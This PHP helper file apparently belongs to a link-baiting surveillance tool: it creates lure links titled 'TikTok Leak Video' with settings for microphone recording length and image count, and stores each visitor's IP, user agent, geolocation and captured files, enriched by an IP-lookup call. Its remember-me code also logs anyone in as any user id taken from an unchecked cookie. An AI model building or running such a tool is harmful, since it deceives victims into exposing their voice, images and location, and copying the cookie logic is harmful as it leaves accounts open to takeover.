<?php
/**
 * Authentication Helper Functions
 */

session_start();

// Global PDO connection
global $pdo;

// Check for remember me cookie
if (!isLoggedIn() && isset($_COOKIE['remember_user']) && isset($_COOKIE['remember_token'])) {
    $_SESSION['user_id'] = $_COOKIE['remember_user'];
    $user = getCurrentUser();
    if ($user) {
        $_SESSION['username'] = $user['username'];
    }
}

/**
 * Check if user is logged in
 */
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

/**
 * Get current logged-in user
 */
function getCurrentUser() {
    if (!isLoggedIn()) {
        return null;
    }
    
    global $pdo;
    $user_id = $_SESSION['user_id'];
    
    $stmt = $pdo->prepare("SELECT id, username, email FROM users WHERE id = ?");
    $stmt->execute([$user_id]);
    $result = $stmt->fetch();
    return $result ?: null;
}

/**
 * Redirect to login if not authenticated
 */
function requireLogin() {
    if (!isLoggedIn()) {
        header("Location: /index.php?page=login");
        exit;
    }
}

/**
 * Redirect to dashboard if already logged in
 */
function redirectIfLoggedIn() {
    if (isLoggedIn()) {
        header("Location: /index.php?page=dashboard");
        exit;
    }
}

/**
 * Hash password
 */
function hashPassword($password) {
    return password_hash($password, PASSWORD_BCRYPT);
}

/**
 * Verify password
 */
function verifyPassword($password, $hash) {
    return password_verify($password, $hash);
}

/**
 * Register new user
 */
function registerUser($username, $email, $password) {
    global $pdo;
    
    // Validate input
    if (strlen($username) < 3) {
        return ['success' => false, 'error' => 'Username must be at least 3 characters'];
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return ['success' => false, 'error' => 'Invalid email address'];
    }
    
    if (strlen($password) < 6) {
        return ['success' => false, 'error' => 'Password must be at least 6 characters'];
    }
    
    // Check if user exists
    $stmt = $pdo->prepare("SELECT id FROM users WHERE username = ? OR email = ?");
    $stmt->execute([$username, $email]);
    if ($stmt->fetch()) {
        return ['success' => false, 'error' => 'Username or email already exists'];
    }
    
    // Hash password
    $hashed_password = hashPassword($password);
    
    // Check if this is the first user
    $is_first_user = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn() == 0;
    $is_admin = $is_first_user ? 1 : 0;

    // Insert user
    try {
        $stmt = $pdo->prepare("INSERT INTO users (username, email, password, is_admin) VALUES (?, ?, ?, ?)");
        $stmt->execute([$username, $email, $hashed_password, $is_admin]);
        return ['success' => true, 'message' => 'Registration successful. Please login.'];
    } catch (Exception $e) {
        return ['success' => false, 'error' => 'Registration failed. Please try again.'];
    }
}

/**
 * Login user
 */
function loginUser($username, $password, $remember = false) {
    global $pdo;
    
    $stmt = $pdo->prepare("SELECT id, username, password FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch();
    
    if (!$user) {
        return ['success' => false, 'error' => 'Invalid username or password'];
    }
    
    if (!verifyPassword($password, $user['password'])) {
        return ['success' => false, 'error' => 'Invalid username or password'];
    }
    
    // Set session
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    
    // Remember me functionality
    if ($remember) {
        $token = bin2hex(random_bytes(32));
        setcookie('remember_token', $token, time() + (30 * 24 * 60 * 60), '/');
        setcookie('remember_user', $user['id'], time() + (30 * 24 * 60 * 60), '/');
    }
    
    return ['success' => true, 'message' => 'Login successful'];
}

/**
 * Logout user
 */
function logoutUser() {
    session_destroy();
    header("Location: /index.php?page=login");
    exit;
}

/**
 * Generate unique link code
 */
function generateLinkCode() {
    return bin2hex(random_bytes(16));
}

/**
 * Get user's links
 */
function getUserLinks($user_id) {
    global $pdo;
    
    $stmt = $pdo->prepare("
        SELECT l.*, COUNT(cd.id) as capture_count
        FROM links l
        LEFT JOIN captured_data cd ON l.id = cd.link_id
        WHERE l.user_id = ?
        GROUP BY l.id
        ORDER BY l.created_at DESC
    ");
    $stmt->execute([$user_id]);
    return $stmt->fetchAll() ?: [];
}

/**
 * Create new link with settings
 */
function createLink($user_id, $tool_type, $redirect_url = 'https://www.tiktok.com', $title = 'TikTok Leak Video', $description = 'Watch the latest viral TikTok leak video before it gets taken down!', $mic_duration = 5, $image_count = 5, $link_image_path = null, $theme = 'default') {
    global $pdo;
    
    if (empty($user_id)) {
        return ['success' => false, 'error' => 'User ID is missing or invalid'];
    }
    
    $link_code = generateLinkCode();
    
    try {
        $stmt = $pdo->prepare("INSERT INTO links (user_id, link_code, tool_type, redirect_url, title, description, mic_duration, image_count, link_image_path, theme) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$user_id, $link_code, $tool_type, $redirect_url, $title, $description, $mic_duration, $image_count, $link_image_path, $theme]);
        return ['success' => true, 'link_code' => $link_code];
    } catch (Exception $e) {
        return ['success' => false, 'error' => 'Failed to create link: ' . $e->getMessage()];
    }
}

/**
 * Get link details
 */
function getLinkDetails($link_code) {
    global $pdo;
    
    $stmt = $pdo->prepare("
        SELECT l.*, u.username, COUNT(cd.id) as capture_count
        FROM links l
        JOIN users u ON l.user_id = u.id
        LEFT JOIN captured_data cd ON l.id = cd.link_id
        WHERE l.link_code = ? AND l.is_active = 1
        GROUP BY l.id
    ");
    $stmt->execute([$link_code]);
    $result = $stmt->fetch();
    return $result ?: null;
}

/**
 * Get IP information from a public API
 */
function getIpInfo($ip) {
    try {
        $ctx = stream_context_create(['http' => ['timeout' => 2]]);
        $res = @file_get_contents("http://ip-api.com/json/$ip?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query", false, $ctx);
        if ($res) {
            return json_decode($res, true);
        }
    } catch (Exception $e) {
        return null;
    }
    return null;
}

/**
 * Save captured data
 */
function saveCapturedData($link_id, $data_type, $data_content, $file_path = null, $latitude = null, $longitude = null, $accuracy = null) {
    global $pdo;
    
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    try {
        $stmt = $pdo->prepare("
            INSERT INTO captured_data (link_id, data_type, data_content, file_path, ip_address, user_agent, latitude, longitude, accuracy)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ");
        return $stmt->execute([$link_id, $data_type, $data_content, $file_path, $ip_address, $user_agent, $latitude, $longitude, $accuracy]);
    } catch (Exception $e) {
        error_log("Error saving data: " . $e->getMessage());
        return false;
    }
}

/**
 * Get captured data for a link
 */
function getCapturedData($link_id) {
    global $pdo;
    
    $stmt = $pdo->prepare("
        SELECT * FROM captured_data
        WHERE link_id = ?
        ORDER BY captured_at DESC
    ");
    $stmt->execute([$link_id]);
    return $stmt->fetchAll() ?: [];
}

/**
 * Delete link
 */
function deleteLink($link_id, $user_id) {
    global $pdo;
    
    // Verify ownership
    $stmt = $pdo->prepare("SELECT id, link_image_path FROM links WHERE id = ? AND user_id = ?");
    $stmt->execute([$link_id, $user_id]);
    $link = $stmt->fetch();
    if (!$link) {
        return ['success' => false, 'error' => 'Unauthorized'];
    }
    
    try {
        // Delete associated data first
        $stmt = $pdo->prepare("DELETE FROM captured_data WHERE link_id = ?");
        $stmt->execute([$link_id]);
        
        // Delete link image if exists
        if ($link['link_image_path'] && file_exists($link['link_image_path'])) {
            unlink($link['link_image_path']);
        }
        
        // Delete link
        $stmt = $pdo->prepare("DELETE FROM links WHERE id = ?");
        $stmt->execute([$link_id]);
        
        return ['success' => true];
    } catch (Exception $e) {
        return ['success' => false, 'error' => 'Failed to delete link'];
    }
}
?>
